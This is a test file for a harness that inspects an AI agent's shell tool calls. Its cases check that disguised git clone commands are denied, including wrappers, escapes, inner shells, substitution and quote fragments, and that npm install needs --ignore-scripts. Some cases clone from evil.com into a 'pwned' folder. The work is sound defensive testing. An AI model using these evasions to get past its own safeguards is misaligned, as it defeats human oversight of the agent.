// __tests__/v4r2r3Hardening.test.mjs
//
// Anchor tests for v4-r2 ROUND-3 hardening. Round 3 found seven more
// critical/high bypasses in the round-2 tokenizer-based detection,
// plus the npm.exe install bypass and the --reference destination
// spoof. Round-3 fix replaces the brittle tokenizer-only approach
// with a TWO-LAYER defense:
//   Layer 1 — substring scan (audit mode AND build mode both)
//   Layer 2 — tokenizer-based destination validation (build mode only)
//
// Round-3 findings:
//   3/3 CRIT — passthrough wrappers w/ own flags (env -i, sudo -E,
//     nice -n, "sudo" git clone, /usr/bin/sudo git clone, & "sudo")
//   3/3 CRIT — bash backslash escape (g\it, gi\t)
//   2/3 CRIT — scriptblocks/inner shells (& {git clone}, cmd /c,
//     bash -c, eval, xargs, git $(echo clone))
//   1/3 CRIT — npm.exe / "npm" install bypass safe-build
//   1/3 HIGH — line-continuation (PS `\n, bash \\\n)
//   1/3 HIGH — subcommand quote-fragment (git cl"o"ne)
//   1/3 HIGH — --reference legit-path spoofs destination

import { test } from "node:test";
import assert from "node:assert/strict";

import { inspectToolCall, activateAudit, deactivateAudit } from "../enforcement.mjs";

const BUILD_ROOT = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck"
    : "/tmp/zerotrust-sourcecheck";
const CLONE_PATH = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck\\octocat-Hello-World-7fd1a60"
    : "/tmp/zerotrust-sourcecheck/octocat-Hello-World-7fd1a60";

function denyTest(name, command, mode = "audit_source") {
    test(name, () => {
        const sid = "v4r2r3-" + Math.random().toString(36).slice(2, 8);
        deactivateAudit(sid);
        activateAudit({
            sessionId: sid,
            buildPath: BUILD_ROOT,
            mode,
            expectedClonePath: CLONE_PATH,
        });
        const r = inspectToolCall({
            sessionId: sid,
            toolName: "powershell",
            toolArgs: { command },
        });
        assert.equal(r.decision, "deny",
            `expected deny, got: ${r.decision} | reason: ${r.reason || ""}`);
        deactivateAudit(sid);
    });
}

// ---- Quoted/full-path/flagged passthrough operators ----

denyTest('v4-r2-r3: `"sudo" git clone` is DENIED', '"sudo" git clone https://github.com/x/y ' + CLONE_PATH);
denyTest("v4-r2-r3: `'sudo' git clone` is DENIED", "'sudo' git clone https://github.com/x/y " + CLONE_PATH);
denyTest('v4-r2-r3: `& "sudo" git clone` is DENIED', '& "sudo" git clone https://github.com/x/y ' + CLONE_PATH);
denyTest('v4-r2-r3: `"nice" git clone` is DENIED', '"nice" git clone https://github.com/x/y ' + CLONE_PATH);
denyTest("v4-r2-r3: `nice -n 19 git clone` (operator with own flag) is DENIED", "nice -n 19 git clone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: `sudo -E git clone` (operator with own flag) is DENIED", "sudo -E git clone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: `env -i git clone` (operator with own flag) is DENIED", "env -i git clone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: `setsid -w git clone` (operator with own flag) is DENIED", "setsid -w git clone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: `/usr/bin/sudo git clone` (full-path operator) is DENIED", "/usr/bin/sudo git clone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: `/bin/nice git clone` (full-path operator) is DENIED", "/bin/nice git clone https://github.com/x/y " + CLONE_PATH);
denyTest('v4-r2-r3: `C:\\Windows\\sudo.exe git clone` (Windows full-path operator) is DENIED', 'C:\\Windows\\sudo.exe git clone https://github.com/x/y ' + CLONE_PATH);

// ---- Bash backslash escape ----

denyTest("v4-r2-r3: bash `g\\it clone` (backslash escape) is DENIED", "g\\it clone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: bash `gi\\t clone` (backslash escape mid-token) is DENIED", "gi\\t clone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: bash `git cl\\one` (backslash escape in subcommand) is DENIED", "git cl\\one https://github.com/x/y " + CLONE_PATH);

// ---- Scriptblocks + inner shells ----

denyTest("v4-r2-r3: PS scriptblock `& { git clone }` is DENIED", "& { git clone https://github.com/x/y " + CLONE_PATH + " }");
denyTest("v4-r2-r3: PS conditional block `if ($true) { git clone }` is DENIED", "if ($true) { git clone https://github.com/x/y " + CLONE_PATH + " }");
denyTest("v4-r2-r3: `cmd /c git clone` (cmd inner-shell) is DENIED", 'cmd /c git clone https://github.com/x/y ' + CLONE_PATH);
denyTest('v4-r2-r3: `bash -c "git clone"` (bash inner-shell) is DENIED', 'bash -c "git clone https://github.com/x/y ' + CLONE_PATH + '"');
denyTest('v4-r2-r3: `pwsh -Command "git clone"` (pwsh inner-shell) is DENIED', 'pwsh -Command "git clone https://github.com/x/y ' + CLONE_PATH + '"');
denyTest('v4-r2-r3: `eval "git clone"` (eval inner-shell) is DENIED', 'eval "git clone https://github.com/x/y ' + CLONE_PATH + '"');
denyTest("v4-r2-r3: `echo url | xargs git clone` (xargs indirection) is DENIED", "echo https://github.com/x/y | xargs git clone");
denyTest("v4-r2-r3: `git $(echo clone) <bad>` (subcommand substitution) is DENIED", "git $(echo clone) https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: backtick `git $(echo clone)` is DENIED", "git `echo clone` https://github.com/x/y " + CLONE_PATH);

// ---- Line continuations ----

denyTest("v4-r2-r3: PS line-continuation `git `\\n` clone` is DENIED",
    "git `\nclone https://github.com/x/y " + CLONE_PATH);
denyTest("v4-r2-r3: bash line-continuation `git \\\\n clone` is DENIED",
    "git \\\nclone https://github.com/x/y " + CLONE_PATH);

// ---- Subcommand quote-fragment ----

denyTest('v4-r2-r3: `git cl"o"ne` (subcommand quote-fragment) is DENIED',
    'git cl"o"ne https://github.com/x/y ' + CLONE_PATH);
denyTest('v4-r2-r3: `g"it" cl"o"ne` (both program and subcommand fragmented) is DENIED',
    'g"it" cl"o"ne https://github.com/x/y ' + CLONE_PATH);

// ---- --reference destination spoof (build mode) ----

test("v4-r2-r3: build-mode `--reference legit-path` does NOT spoof destination (real dest is bad)", () => {
    const sid = "v4r2r3-ref-spoof-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const badDest = process.platform === "win32" ? "C:\\Users\\testuser\\Desktop\\pwned" : "/tmp/pwned";
    const cmd = `git clone https://evil.com/payload ${badDest} --reference ${CLONE_PATH}`;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "deny",
        `expected deny on real dest outside build_root, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("v4-r2-r3: build-mode `--separate-git-dir legit-path` does NOT spoof destination", () => {
    const sid = "v4r2r3-sgd-spoof-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const badDest = process.platform === "win32" ? "C:\\Users\\testuser\\Desktop\\pwned" : "/tmp/pwned";
    const cmd = `git clone https://evil.com/payload ${badDest} --separate-git-dir ${CLONE_PATH}`;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "deny");
    deactivateAudit(sid);
});

test("v4-r2-r3: build-mode `--branch foo` (legit value-flag) does NOT break good clone", () => {
    const sid = "v4r2r3-branch-good-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const cmd = `git -c protocol.file.allow=never -c core.symlinks=false clone --no-recurse-submodules --filter=blob:none --no-checkout --branch main https://github.com/octocat/Hello-World ${CLONE_PATH}`;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "allow",
        `expected allow on good clone with --branch, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

// ---- npm.exe / "npm" install bypass ----

test("v4-r2-r3: `npm.exe install` in safe-build WITHOUT --ignore-scripts is DENIED", () => {
    const sid = "v4r2r3-npmexe-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "npm.exe install" },
    });
    assert.equal(r.decision, "deny");
    assert.match(r.reason, /ignore-scripts/i);
    deactivateAudit(sid);
});

test('v4-r2-r3: `"npm" install` in safe-build WITHOUT --ignore-scripts is DENIED', () => {
    const sid = "v4r2r3-npmq-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: '"npm" install' },
    });
    assert.equal(r.decision, "deny");
    assert.match(r.reason, /ignore-scripts/i);
    deactivateAudit(sid);
});

test("v4-r2-r3: `npm.exe install --ignore-scripts` in safe-build is ALLOWED", () => {
    const sid = "v4r2r3-npmsafe-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "npm.exe install --ignore-scripts" },
    });
    assert.notEqual(r.decision, "deny",
        `expected not deny (decision is allow or undefined), got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("v4-r2-r3: `npm.exe install` in audit_source (no build) is DENIED", () => {
    const sid = "v4r2r3-npmaudit-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "npm.exe install --ignore-scripts" },
    });
    assert.equal(r.decision, "deny");
    assert.match(r.reason, /does not include a build step|build mode/i);
    deactivateAudit(sid);
});

// Sanity: legit commands still pass through with no opinion.

test("v4-r2-r3 sanity: `git status` is allowed (no opinion)", () => {
    const sid = "v4r2r3-status-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "git status" },
    });
    assert.notEqual(r.decision, "deny",
        `git status without 'clone' must not deny, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("v4-r2-r3 sanity: `echo hello` is allowed (no opinion)", () => {
    const sid = "v4r2r3-echo-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "echo hello world" },
    });
    assert.notEqual(r.decision, "deny");
    deactivateAudit(sid);
});

test("v4-r2-r3 sanity: hardened raw git clone in build mode is ALLOWED (regression check)", () => {
    const sid = "v4r2r3-allow-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const cmd = "git -c protocol.file.allow=never -c core.symlinks=false clone --no-recurse-submodules --filter=blob:none --no-checkout https://github.com/octocat/Hello-World " + CLONE_PATH;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "allow");
    deactivateAudit(sid);
});
